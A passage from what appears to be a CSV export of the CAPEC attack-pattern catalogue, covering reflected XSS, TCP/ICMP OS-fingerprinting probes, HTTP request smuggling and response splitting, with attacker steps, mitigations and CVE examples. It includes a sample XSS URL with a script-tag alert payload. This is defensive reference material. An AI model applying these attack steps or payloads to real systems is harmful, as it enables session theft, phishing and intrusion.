find.:TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe public links for XSS vulnerability] The adversary uses the public links gathered in the Explore phase as a target list and requests variations on the URLs they spidered before. They send parameters that include variations of payloads. They record all the responses from the server that include unmodified versions of their script.:TECHNIQUE:Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier.:TECHNIQUE:Use a proxy tool to record results of manual input of XSS probes in known URLs.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Change a URL parameter to include a malicious script tag.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::\",\"::Target client software must allow scripting such as JavaScript. Server software must allow display of remote generated HTML without sufficient input or output validation.::\",\"::SKILL:To place malicious payload on server via HTTP:LEVEL:Low::SKILL:Exploiting any information gathered by HTTP Query on script host:LEVEL:High::\",\"::Ability to send HTTP post to scripting host and collect output::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Design: Use browser technologies that do not allow client side scripting.::Design: Utilize strict type, character, and encoding enforcement::Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.::Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Implementation: Perform input validation for all remote content, including remote and user-generated content::Implementation: Perform output validation for all remote content.::Implementation: Disable scripting languages such as JavaScript in browser::Implementation: Session tokens for specific host::Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.::Implementation: Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode::\",\"::http://user:host@example.com:8080/oradb<script>alert('Hi')</script>::Web applications that accept name value pairs in a HTTP Query string are inherently at risk to any value (or name for that matter) that an adversary would like to enter in the query string. This can be done manually via web browser or trivially scripted to post the query string to multiple sites. In the latter case, in the instance of many sites using similar infrastructure with predictable http queries being accepted and operated on (such as blogging software, Google applications, and so on), a single malicious payload can be scripted to target a wide variety of sites. Web 2.0 type sites like Technorati and del.icio.us rely on user generated content like tags to build http links that are displayed to other users. del.icio.us allows users to identify sites, tag them with metadata and provide URL, descriptions and more data. This data is then echoed back to any other web browser that is interested in the link. If the data is not validated by the del.icio.us site properly then an arbitrary code can be added into the standard http string sent to del.icio.us by the adversary, for example formatted as normal content with a URL and description and tagged as Java, and available to be clicked on (and executed by) any user browsing for Java content that clicks on this trojaned content.::\",\"::80::\",\"\",\"\",\n320,\"TCP Timestamp Probe\",Detailed,Stable,\"This OS fingerprinting probe examines the remote server's implementation of TCP timestamps. Not all operating systems implement timestamps within the TCP header, but when timestamps are used then this provides the attacker with a means to guess the operating system of the target. The attacker begins by probing any active TCP service in order to get response which contains a TCP timestamp. Different Operating systems update the timestamp value using different intervals. This type of analysis is most accurate when multiple timestamp responses are received and then analyzed. TCP timestamps can be found in the TCP Options field of the TCP header.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine if timestamps are present.] The adversary sends a probe packet to the remote host to identify if timestamps are present.::STEP:2:PHASE:Experiment:DESCRIPTION:[Record and analyze timestamp values.] If the remote host is using timestamp, obtain several timestamps, analyze them and compare them to known values.:TECHNIQUE:The adversary sends several requests and records the timestamp values.:TECHNIQUE:The adversary analyzes the timestamp values and determines an average increments per second in the timestamps for the target.:TECHNIQUE:The adversary compares this result to a database of known TCP timestamp increments for a possible match.::\",\"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.The target OS must support the TCP timestamp option in order to obtain a fingerprint.::\",\"\",\"::Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges. A tool capable of sending and receiving packets from a remote system.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"\",\"\",\"::200::\",\"\",\"\",\n321,\"TCP Sequence Number Probe\",Detailed,Stable,\"This OS fingerprinting probe tests the target system's assignment of TCP sequence numbers. One common way to test TCP Sequence Number generation is to send a probe packet to an open port on the target and then compare the how the Sequence Number generated by the target relates to the Acknowledgement Number in the probe packet. Different operating systems assign Sequence Numbers differently, so a fingerprint of the operating system can be obtained by categorizing the relationship between the acknowledgement number and sequence number as follows: 1) the Sequence Number generated by the target is Zero, 2) the Sequence Number generated by the target is the same as the acknowledgement number in the probe, 3) the Sequence Number generated by the target is the acknowledgement number plus one, or 4) the Sequence Number is any other non-zero number.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"\",\"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::A tool capable of sending and receiving packets from a remote system.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n322,\"TCP (ISN) Greatest Common Divisor Probe\",Detailed,Stable,\"This OS fingerprinting probe sends a number of TCP SYN packets to an open port of a remote machine. The Initial Sequence Number (ISN) in each of the SYN/ACK response packets is analyzed to determine the smallest number that the target host uses when incrementing sequence numbers. This information can be useful for identifying an operating system because particular operating systems and versions increment sequence numbers using different values. The result of the analysis is then compared against a database of OS behaviors to determine the OS type and/or version.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"\",\"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::A tool capable of sending and receiving packets from a remote system.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n323,\"TCP (ISN) Counter Rate Probe\",Detailed,Stable,\"This OS detection probe measures the average rate of initial sequence number increments during a period of time. Sequence numbers are incremented using a time-based algorithm and are susceptible to a timing analysis that can determine the number of increments per unit time. The result of this analysis is then compared against a database of operating systems and versions to determine likely operation system matches.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"\",\"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges. A tool capable of sending and receiving packets from a remote system.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n324,\"TCP (ISN) Sequence Predictability Probe\",Detailed,Stable,\"This type of operating system probe attempts to determine an estimate for how predictable the sequence number generation algorithm is for a remote host. Statistical techniques, such as standard deviation, can be used to determine how predictable the sequence number generation is for a system. This result can then be compared to a database of operating system behaviors to determine a likely match for operating system and version.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"\",\"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::A tool capable of sending and receiving packets from a remote system.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n325,\"TCP Congestion Control Flag (ECN) Probe\",Detailed,Stable,\"This OS fingerprinting probe checks to see if the remote host supports explicit congestion notification (ECN) messaging. ECN messaging was designed to allow routers to notify a remote host when signal congestion problems are occurring. Explicit Congestion Notification messaging is defined by RFC 3168. Different operating systems and versions may or may not implement ECN notifications, or may respond uniquely to particular ECN flag types.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"\",\"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::A tool capable of sending and receiving packets from a remote system.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n326,\"TCP Initial Window Size Probe\",Detailed,Stable,\"This OS fingerprinting probe checks the initial TCP Window size. TCP stacks limit the range of sequence numbers allowable within a session to maintain the connected state within TCP protocol logic. The initial window size specifies a range of acceptable sequence numbers that will qualify as a response to an ACK packet within a session. Various operating systems use different Initial window sizes. The initial window size can be sampled by establishing an ordinary TCP connection.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"\",\"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::A tool capable of sending and receiving packets from a remote system.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n327,\"TCP Options Probe\",Detailed,Stable,\"This OS fingerprinting probe analyzes the type and order of any TCP header options present within a response segment. Most operating systems use unique ordering and different option sets when options are present. RFC 793 does not specify a required order when options are present, so different implementations use unique ways of ordering or structuring TCP options. TCP options can be generated by ordinary TCP traffic.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"\",\"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::A tool capable of sending and receiving packets from a remote system.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n328,\"TCP 'RST' Flag Checksum Probe\",Detailed,Stable,\"This OS fingerprinting probe performs a checksum on any ASCII data contained within the data portion or a RST packet. Some operating systems will report a human-readable text message in the payload of a 'RST' (reset) packet when specific types of connection errors occur. RFC 1122 allows text payloads within reset packets but not all operating systems or routers implement this functionality.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"\",\"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::A tool capable of sending and receiving packets from a remote system.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n329,\"ICMP Error Message Quoting Probe\",Detailed,Stable,\"An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the amount of data returned or Quoted from the originating request that generated the ICMP error message.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"\",\"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, Port Unreachable..::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n33,\"HTTP Request Smuggling\",Detailed,Stable,\"An adversary abuses the flexibility and discrepancies in the parsing and interpretation of HTTP Request messages using various HTTP headers, request-line and body parameters as well as message sizes (denoted by the end of message signaled by a given HTTP header) by different intermediary HTTP agents (e.g., load balancer, reverse proxy, web caching proxies, application firewalls, etc.) to secretly send unauthorized and malicious HTTP requests to a back-end HTTP agent (e.g., web server). See CanPrecede relationships for possible consequences.\",\"::TERM:HTTP Desync:DESCRIPTION:Modification/manipulation of HTTP message headers, request-line and body parameters to disrupt and interfere in the interpretation and parsing of HTTP message lengths/boundaries for consecutive HTTP messages by HTTP agents in a HTTP chain or network path.::\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:220::NATURE:PeerOf:CAPEC ID:273::NATURE:CanPrecede:CAPEC ID:115::NATURE:CanPrecede:CAPEC ID:141::NATURE:CanPrecede:CAPEC ID:63::NATURE:CanPrecede:CAPEC ID:593::NATURE:CanPrecede:CAPEC ID:148::NATURE:CanPrecede:CAPEC ID:154::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets.:TECHNIQUE:Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer.::STEP:1:PHASE:Experiment:DESCRIPTION:[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, message sizes, and HTTP headers.::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause differential HTTP responses by experimenting with identified HTTP Request vulnerabilities] The adversary sends maliciously crafted HTTP requests to interfere with the parsing of intermediary and back-end HTTP infrastructure, followed by normal/benign HTTP request from the adversary or a random user. The intended consequences of the malicious HTTP requests will be observed in the HTTP infrastructure response to the normal/benign HTTP request to confirm applicability of identified vulnerabilities in the adversary's plan of attack.:TECHNIQUE:Continue the monitoring of HTTP traffic.:TECHNIQUE:Utilize various combinations of HTTP Headers within a single HTTP Request such as: Content-Length & Transfer-Encoding (CL;TE), Transfer-Encoding & Content-Length (TE;CL), or double Transfer-Encoding (TE;TE), so that additional embedded requests or data in the body of the original request are unprocessed and treated as part of subsequent requests by the intended target HTTP agent. From these HTTP Header combinations the adversary observes any timing delays (usually in the form of HTTP 404 Error response) or any other unintended consequences. For CL;TE and TE;CL HTTP header combinations, the first HTTP agent, in the HTTP message path that receives the HTTP request, takes precedence or only processes one header but not the other, while the second/final HTTP agent processes the opposite header, allowing for embedded HTTP requests to be ignored and smuggled to the intended target HTTP agent. For TE;TE HTTP headers combination, all HTTP agents in HTTP message path process Transfer-Encoding header, however, adversary obfuscation (see Mitigations for details) of one of the Transfer-Encoding headers, by not adhering strictly to the protocol specification, can cause it to be unprocessed/ignored by a designated HTTP agent, hence allowing embedded HTTP requests to be smuggled. .:TECHNIQUE:Construct a very large HTTP request using multiple Content-Length headers of various data lengths that can potentially cause subsequent requests to be ignored by an intermediary HTTP agent (firewall) and/or eventually parsed separately by the target HTTP agent (web server). Note that most modern HTTP infrastructure reject HTTP requests with multiple Content-Length headers.:TECHNIQUE:Follow an unrecognized (sometimes a RFC compliant) HTTP header with a subsequent HTTP request to potentially cause the HTTP request to be ignored and interpreted as part of the preceding HTTP request.::STEP:1:PHASE:Exploit:DESCRIPTION:[Perform HTTP Request Smuggling attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.:TECHNIQUE:Leverage techniques identified in the Experiment Phase.::\",\"::An additional intermediary HTTP agent such as an application firewall or a web caching proxy between the adversary and the second agent such as a web server, that sends multiple HTTP messages over same network connection.::Differences in the way the two HTTP agents parse and interpret HTTP requests and its headers.::HTTP agents running on HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses.::\",\"::SKILL:Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers.:LEVEL:Medium::SKILL:Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers.:LEVEL:Medium::SKILL:Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers.:LEVEL:Medium::\",\"::Tools capable of crafting malicious HTTP messages and monitoring HTTP message responses.::\",\"::Differences in requests processed by the two agents. This requires careful monitoring or a capable log analysis tool.::\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.::Configuration: front-end HTTP agents notice ambiguous requests.::Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.::Configuration: Disable reuse of back-end connections.::Configuration: Use HTTP/2 for back-end connections.::Configuration: Use the same web server software for front-end and back-end server.::Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.::Configuration: Prioritize Transfer-Encoding header over Content-Length, whenever an HTTP message contains both.::Configuration: Disallow HTTP messages with both Transfer-Encoding and Content-Length or Double Content-Length Headers.::Configuration: Disallow Malformed/Invalid Transfer-Encoding Headers used in obfuscation, such as: Headers with no space before the value “chunked” Headers with extra spaces Headers beginning with trailing characters Headers providing a value “chunk” instead of “chunked” (the server normalizes this as chunked encoding) Headers with multiple spaces before the value “chunked” Headers with quoted values (whether single or double quotations) Headers with CRLF characters before the value “chunked” Values with invalid characters::Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)::Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.::Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input.::\",\"::When using Haproxy 1.5.3 version as front-end proxy server with with Node.js version 14.13.1 or 12.19.0 as the back-end web server it is possible to use two same header fields for example: two Transfer-Encoding, Transfer-Encoding: chunked and Transfer-Encoding: chunked-false, to bypass Haproxy /flag URI restriction and receive the Haproxy flag value, since Node.js identifies the first header but ignores the second header. See also: CVE-2020-8287::When using Sun Java System Web Proxy Server 3.x or 4.x in conjunction with Sun ONE/iPlanet 6.x, Sun Java System Application Server 7.x or 8.x, it is possible to bypass certain application firewall protections, hijack web sessions, perform Cross Site Scripting or poison the web proxy cache using HTTP Request Smuggling. Differences in the way HTTP requests are parsed by the Proxy Server and the Application Server enable malicious requests to be smuggled through to the Application Server, thereby exposing the Application Server to aforementioned attacks. See also: CVE-2006-6276::Apache server 2.0.45 and version before 1.3.34, when used as a proxy, easily lead to web cache poisoning and bypassing of application firewall restrictions because of non-standard HTTP behavior. Although the HTTP/1.1 specification clearly states that a request with both Content-Length and a Transfer-Encoding: chunked headers is invalid, vulnerable versions of Apache accept such requests and reassemble the ones with Transfer-Encoding: chunked header without replacing the existing Content-Length header or adding its own. This leads to HTTP Request Smuggling using a request with a chunked body and a header with Content-Length: 0. See also: CVE-2005-2088::\",\"::444::\",\"TAXONOMY NAME:WASC:ENTRY ID:26:ENTRY NAME:HTTP Request Smuggling::\",\"TYPE:Terminology:NOTE:HTTP Splitting – the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender’s intension. The messages sent are 100% valid and RFC compliant [REF-117].::::TYPE:Terminology:NOTE:HTTP Smuggling – the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender’s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way [REF-117].::::TYPE:Relationship:NOTE:HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against.::\",\n330,\"ICMP Error Message Echoing Integrity Probe\",Detailed,Stable,\"An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the integrity of data returned or Quoted from the originating request that generated the error message.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"\",\"::The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, Port Unreachable..::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::200::\",\"\",\"\",\n331,\"ICMP IP Total Length Field Probe\",Detailed,Stable,\"An adversary sends a UDP packet to a closed port on the target machine to solicit an IP Header's total length field value within the echoed 'Port Unreachable error message. This type of behavior is useful for building a signature-base of operating system responses, particularly when error messages contain other types of information that is useful identifying specific operating system responses.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"\",\"::The ability to monitor and interact with network communications. Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, Port Unreachable.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::204::\",\"\",\"\",\n332,\"ICMP IP 'ID' Field Error Message Probe\",Detailed,Stable,\"An adversary sends a UDP datagram having an assigned value to its internet identification field (ID) to a closed port on a target to observe the manner in which this bit is echoed back in the ICMP error message. This allows the attacker to construct a fingerprint of specific OS behaviors.\",\"\",Medium,Low,\"::NATURE:ChildOf:CAPEC ID:312::\",\"\",\"::The ability to monitor and interact with network communications. Access to at least one host, and the privileges to interface with the network interface card.::\",\"\",\"::A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, Port Unreachable.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::\",\"\",\"\",\"::204::\",\"\",\"\",\n34,\"HTTP Response Splitting\",Detailed,Stable,\"An adversary manipulates and injects malicious content, in the form of secret unauthorized HTTP responses, into a single HTTP response from a vulnerable or compromised back-end HTTP agent (e.g., web server) or into an already spoofed HTTP response from an adversary controlled domain/site. See CanPrecede relationships for possible consequences.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:220::NATURE:PeerOf:CAPEC ID:105::NATURE:CanPrecede:CAPEC ID:115::NATURE:CanPrecede:CAPEC ID:141::NATURE:CanPrecede:CAPEC ID:63::NATURE:CanPrecede:CAPEC ID:593::NATURE:CanPrecede:CAPEC ID:148::NATURE:CanPrecede:CAPEC ID:154::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets:TECHNIQUE:Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer.::STEP:1:PHASE:Experiment:DESCRIPTION:[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, HTTP headers, syntax checking and input filtering.::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause differential HTTP responses by experimenting with identified HTTP Request vulnerabilities] The adversary sends maliciously crafted HTTP request to back-end HTTP infrastructure to inject adversary data (in the form of HTTP headers with custom strings and embedded web scripts and objects) into HTTP responses (intended for intermediary and/or front-end client/victim HTTP agents communicating with back-end HTTP infrastructure) for the purpose of interfering with the parsing of HTTP responses by intermediary and front-end client/victim HTTP agents. The intended consequences of the malicious HTTP request and the subsequent adversary injection and manipulation of HTTP responses to intermediary and front-end client/victim HTTP agents, will be observed to confirm applicability of identified vulnerabilities in the adversary's plan of attack.:TECHNIQUE:Continue the monitoring of HTTP traffic.:TECHNIQUE:Utilize different sequences of special characters (CR - Carriage Return, LF - Line Feed, HT - Horizontal Tab, SP - Space and etc.) to bypass filtering and back-end encoding and to embed: additional HTTP Requests with their own headers malicious web scripts into parameters of HTTP Request headers (e.g., browser cookies like Set-Cookie or Ajax web/browser object parameters like XMLHttpRequest) adversary chosen encoding (e.g., UTF-7) to utilize additional special characters (e.g., > and <) filtered by the target HTTP agent. Note that certain special characters and character encoding may be applicable only to intermediary and front-end agents with rare configurations or that are not RFC compliant.:TECHNIQUE:Follow an unrecognized (sometimes a RFC compliant) HTTP header with a subsequent HTTP request to potentially cause the HTTP request to be ignored and interpreted as part of the preceding HTTP request.::STEP:1:PHASE:Exploit:DESCRIPTION:[Perform HTTP Response Splitting attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.:TECHNIQUE:Leverage techniques identified in the Experiment Phase.::\",\"::A vulnerable or compromised server or domain/site capable of allowing adversary to insert/inject malicious content that will appear in the server's response to target HTTP agents (e.g., proxies and users' web browsers).::Differences in the way the two HTTP agents parse and interpret HTTP requests and its headers.::HTTP headers capable of being user-manipulated.::HTTP agents running on HTTP/1.0 or HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses.::\",\"::SKILL:Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers.:LEVEL:Medium::SKILL:Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers.:LEVEL:Medium::SKILL:Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers.:LEVEL:Medium::\",\"::Tools capable of monitoring HTTP messages, and crafting malicious HTTP messages and/or injecting malicious content into HTTP messages.::\",\"::Differences in responses processed by the two agents with multiple responses to a single request in the web logs. This requires careful monitoring or a capable log analysis tool.::\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.::Configuration: front-end HTTP agents notice ambiguous requests.::Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.::Configuration: Disable reuse of back-end connections.::Configuration: Use HTTP/2 for back-end connections.::Configuration: Use the same web server software for front-end and back-end server.::Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.::Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)::Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.::Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input.::\",\"::In the PHP 5 session extension mechanism, a user-supplied session ID is sent back to the user within the Set-Cookie HTTP header. Since the contents of the user-supplied session ID are not validated, it is possible to inject arbitrary HTTP headers into the response body. This immediately enables HTTP Response Splitting by simply terminating the HTTP response header from within the session ID used in the Set-Cookie directive. See also: CVE-2006-0207::\",\"::74::113::138::436::\",\"TAXONOMY NAME:WASC:ENTRY ID:25:ENTRY NAME:HTTP Response Splitting::\",\"TYPE:Terminology:NOTE:HTTP Splitting – the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender’s intension. The messages sent are 100% valid and RFC compliant [REF-117].::::TYPE:Terminology:NOTE:HTTP Smuggling – the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender’s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way [REF-117].::::TYPE:Relationship:NOTE:HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against.::\",\n35,\"Leverage Executable Code in Non-Executable Files\",Detailed,Draft,\"An attack of this type exploits a system's trust in configuration and resource files. When the executable loads the resource (such as an image file or configuration file) the attacker has modified the file to either execute malicious code directly or manipulate the target process (e.g. application server) to execute based on the malicious configuration parameters. Since systems are increasingly interrelated mashing up resources from local and remote sources the possibility of this attack occurring is high.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC 